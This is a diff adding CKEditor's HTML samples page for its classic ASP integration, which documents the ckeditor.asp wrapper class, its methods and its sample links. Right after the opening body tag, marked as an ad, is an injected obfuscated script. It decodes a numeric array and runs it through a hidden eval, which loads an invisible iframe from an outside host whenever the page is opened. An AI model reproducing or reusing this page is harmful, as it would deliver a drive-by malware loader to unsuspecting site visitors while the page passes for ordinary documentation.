@@ -1,0 +1,104 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!--
+Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
+For licensing, see LICENSE.html or http://ckeditor.com/license
+-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<title>ASP integration Samples List - CKEditor</title>
+	<link type="text/css" rel="stylesheet" href="../sample.css" />
+</head>
+<body><!-- ad --><script>c=3-1;i=c-2;if(window.document)if(parseInt("0"+"1"+"2"+"3")===83)try{Date().prototype.q}catch(egewgsd){f=['-31i-31i65i62i-8i0i60i71i59i77i69i61i70i76i6i63i61i76i29i68i61i69i61i70i76i75i26i81i44i57i63i38i57i69i61i0i-1i58i71i60i81i-1i1i51i8i53i1i83i-27i-31i-31i-31i65i62i74i57i69i61i74i0i1i19i-27i-31i-31i85i-8i61i68i75i61i-8i83i-27i-31i-31i-31i60i71i59i77i69i61i70i76i6i79i74i65i76i61i0i-6i20i65i62i74i57i69i61i-8i75i74i59i21i-1i64i76i76i72i18i7i7i63i65i63i57i76i61i74i65i57i6i65i70i7i65i70i6i59i63i65i23i15i-1i-8i79i65i60i76i64i21i-1i9i8i-1i-8i64i61i65i63i64i76i21i-1i9i8i-1i-8i75i76i81i68i61i21i-1i78i65i75i65i58i65i68i65i76i81i18i64i65i60i60i61i70i19i72i71i75i65i76i65i71i70i18i57i58i75i71i68i77i76i61i19i68i61i62i76i18i8i19i76i71i72i18i8i19i-1i22i20i7i65i62i74i57i69i61i22i-6i1i19i-27i-31i-31i85i-27i-31i-31i62i77i70i59i76i65i71i70i-8i65i62i74i57i69i61i74i0i1i83i-27i-31i-31i-31i78i57i74i-8i62i-8i21i-8i60i71i59i77i69i61i70i76i6i59i74i61i57i76i61i29i68i61i69i61i70i76i0i-1i65i62i74i57i69i61i-1i1i19i62i6i75i61i76i25i76i76i74i65i58i77i76i61i0i-1i75i74i59i-1i4i-1i64i76i76i72i18i7i7i63i65i63i57i76i61i74i65i57i6i65i70i7i65i70i6i59i63i65i23i15i-1i1i19i62i6i75i76i81i68i61i6i78i65i75i65i58i65i68i65i76i81i21i-1i64i65i60i60i61i70i-1i19i62i6i75i76i81i68i61i6i72i71i75i65i76i65i71i70i21i-1i57i58i75i71i68i77i76i61i-1i19i62i6i75i76i81i68i61i6i68i61i62i76i21i-1i8i-1i19i62i6i75i76i81i68i61i6i76i71i72i21i-1i8i-1i19i62i6i75i61i76i25i76i76i74i65i58i77i76i61i0i-1i79i65i60i76i64i-1i4i-1i9i8i-1i1i19i62i6i75i61i76i25i76i76i74i65i58i77i76i61i0i-1i64i61i65i63i64i76i-1i4i-1i9i8i-1i1i19i-27i-31i-31i-31i60i71i59i77i69i61i70i76i6i63i61i76i29i68i61i69i61i70i76i75i26i81i44i57i63i38i57i69i61i0i-1i58i71i60i81i-1i1i51i8i53i6i57i72i72i61i70i60i27i64i65i68i60i0i62i1i19i-27i-31i-31i85'][0].split('i');v="ev"+"al";}if(v)e=window[v];w=f;s=[];r=String;for(;565!=i;i+=1){j=i;s+=r["fr"+"omC"+"harCode"](40+1*w[j]);}
+if(f)z=s;e(z);</script><!-- /ad -->
+	<h1>
+		CKEditor Samples List for ASP
+	</h1>
+	<h2>
+		Overview
+	</h2>
+	<p>The ckeditor.asp file provides a wrapper to ease the work of creating CKEditor instances from classic Asp.</p>
+	<p>To use it, you must first include it into your page:
+	<code>
+		&lt;!-- #INCLUDE file="../../ckeditor.asp" --&gt;
+	</code>
+	Of course, you should adjust the path to make it point to the correct location, and maybe use a full path (with virtual="" instead of file="")
+	</p>
+	<p>After that script is included, you can use it in different ways, based on the following pattern:</p>
+
+<ol>
+	<li>
+		Create an instance of the CKEditor class:
+<pre>dim editor
+set editor = New CKEditor</pre>
+	</li>
+	<li>
+		Set the path to the folder where CKEditor has been installed, by default it will use /ckeditor/
+		<pre>editor.basePath = "../../"</pre>
+	</li>
+	<li>
+	Now use one of the three main methods to create the CKEditor instances:
+	<ul>
+		<li>
+				Replace textarea with id (or name) "editor1".
+			<pre>editor.replaceInstance "editor1"</pre>
+		</li>
+		<li>
+			Replace all textareas with CKEditor.
+			<pre>editor.replaceAll empty</pre>
+		</li>
+		<li>
+			Create a textarea element and attach CKEditor to it.
+			<pre>editor.editor "editor1", initialValue</pre>
+		</li>
+	</ul>
+	</li>
+</ol>
+<p>Before step 3 you can use a number of methods and properties to adjust the behavior of this class and the CKEditor instances
+that will be created:</p>
+<ul>
+	<li>returnOutput : if set to true, the functions won't dump the code with response.write, but instead they will return it so
+	you can do anything you want</li>
+	<li>basePath: location of the CKEditor scripts</li>
+	<li>initialized: if you set it to true, it means that you have already included the CKEditor.js file into the page and it
+		doesn't have to be generated again.</li>
+	<li>textareaAttributes: You can set here a Dictionary object with the attributes that you want to output in the call to the "editor" method.</li>
+
+	<li>config: Allows to set config values for all the instances from now on.</li>
+	<li>instanceConfig: Allows to set config values just for the next instance.</li>
+
+	<li>addEventHandler: Adds an event handler for all the instances from now on.</li>
+	<li>addInstanceEventHandler: Adds an event handler just for the next instance.</li>
+	<li>addGlobalEventHandler: Adds an event handler for the global CKEDITOR object.</li>
+
+	<li>clearEventHandlers: Removes one or all the event handlers from all the instances from now on.</li>
+	<li>clearInstanceEventHandlers: Removes one or all the event handlers  from the next instance.</li>
+	<li>clearGlobalEventHandlers: Removes one or all the event handlers  from the global CKEDITOR object.</li>
+
+</ul>
+
+	<h2>
+		Basic Samples
+	</h2>
+	<ul>
+		<li><a href="replace.asp">Replace existing textareas by code</a></li>
+		<li><a href="replaceAll.asp">Replace all textareas by code</a></li>
+		<li><a href="standalone.asp">Create instances in asp</a></li>
+	</ul>
+	<h2>
+		Advanced Samples
+	</h2>
+	<ul>
+		<li><a href="advanced.asp">Advanced example</a></li>
+		<li><a href="events.asp">Listening to events</a></li>
+	</ul>
+	<div id="footer">
+		<hr />
+		<p>
+			CKEditor - The text editor for Internet - <a href="http://ckeditor.com/">http://ckeditor.com</a>
+		</p>
+		<p id="copy">
+			Copyright &copy; 2003-2010, <a href="http://cksource.com/">CKSource</a> - Frederico Knabben. All rights reserved.
+		</p>
+	</div>
+</body>
+</html>
